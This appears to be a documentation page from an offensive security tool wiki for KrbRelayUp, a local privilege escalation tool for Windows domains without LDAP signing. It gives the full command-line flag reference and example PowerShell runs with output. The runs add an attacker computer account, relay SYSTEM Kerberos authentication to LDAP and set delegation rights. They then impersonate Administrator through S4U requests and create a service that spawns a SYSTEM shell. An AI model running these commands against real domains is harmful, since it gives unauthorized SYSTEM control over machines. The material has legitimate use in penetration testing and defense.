---
title : "KrbRelayUp"
# pre : ' '
description : "A universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings)."
date : 2022-04-26T13:05:29+02:00
# hidden : true
# draft : true
weight : 40
# tags : ['']
---

---

## Installation

Build the binary from [source](https://github.com/Dec0ne/KrbRelayUp) or use the pre-compiled binary below.

{{%resources fa_icon_class="far fa-file" pattern=".*(exe)"/%}}

## Usage

```plain
KrbRelayUp.exe relay -d FQDN -cn COMPUTER [-c] [-cp PASSWORD | -ch NTHASH]
```

## Flags

```plain
KrbRelayUp - Relaying you to SYSTEM

FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.

RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.
Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]

    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP <rbcd/shadowcred> (default=rbcd)
    -p   (--Port)                     Port for Com Server (default=12345)
    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)

    # RBCD Method:
    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.
    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)
    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])

    # SHADOWCRED Method:
    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)

    # ADCS Method:
    -ca  (--CAEndpoint)               CA endpoint FQDN (default = same as DC)
    -https                            Connect to CA endpoint over secure HTTPS instead of HTTP
    -cet (--CertificateTemplate)      Certificate template to request for (default=Machine)


SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.
Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] <-i USERTOIMPERSONATE>

    -m   (--Method)                   Abuse method used in RELAY phase <rbcd/shadowcred> (default=rbcd)
    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)
    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)
    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)

    # RBCD Method:
    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)
    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)
    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)

    # SHADOWCRED | ADCS Method:
    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file
    -cep (--CertificatePassword)      Certificate password (if applicable)


KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.
Usage: KrbRelayUp.exe krbscm <-s SERVICENAME> <-sc SERVICECOMMANDLINE>

    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)
    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)


General Options:
    -d  (--Domain)                   FQDN of domain. (Optional)
    -dc (--DomainController)         FQDN of domain controller. (Optional)
    -ssl                             Use LDAP over SSL. (Optional)
    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)
    -v  (--Verbose)                  Show verbose output. (Optional)
```

## Examples

```plain
PS C:\Users\johndo\Desktop> .\KrbRelayUp.exe relay -Domain offsec.nl -CreateNewComputerAccount -ComputerName receptie-pc$ -ComputerPassword Welkom1234
KrbRelayUp - Relaying you to SYSTEM


[+] Computer account "receptie-pc$" added with password "Welkom1234"
[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
    ./KrbRelayUp spawn -d offsec.nl -cn receptie-pc$ -cp Welkom1234

PS C:\Users\johndo\Desktop> .\KrbRelayUp.exe spawn -d offsec.nl -cn receptie-pc$ -cp Welkom1234
KrbRelayUp - Relaying you to SYSTEM

[+] TGT request successful!
[+] Ticket successfully imported!
[+] Building S4U2self
[*] Using domain controller: SRV2022.offsec.nl (10.20.30.11)
[+] Sending S4U2self request to 10.20.30.11:88
[+] S4U2self success!
[+] Got a TGS for 'Administrator' to 'receptie-pc$@OFFSEC.NL'
[+] Impersonating user 'Administrator' to target SPN 'HOST/WIN10'
[+] Building S4U2proxy request for service: 'HOST/WIN10'
[*] Using domain controller: SRV2022.offsec.nl (10.20.30.11)
[+] Sending S4U2proxy request to domain controller 10.20.30.11:88
[+] S4U2proxy success!
[+] Ticket successfully imported!
[+] Using ticket to connect to Service Manger
[+] AcquireCredentialsHandleHook called for package N
[+] Changing to Kerberos package
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00090312
[+] InitializeSecurityContextHook called for target H
[+] InitializeSecurityContext status = 0x00000000
[+] KrbSCM Service created
[+] KrbSCM Service started
[+] Clean-up done
```

![Example](images/example.png)

## URL List

- [Github.com - KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
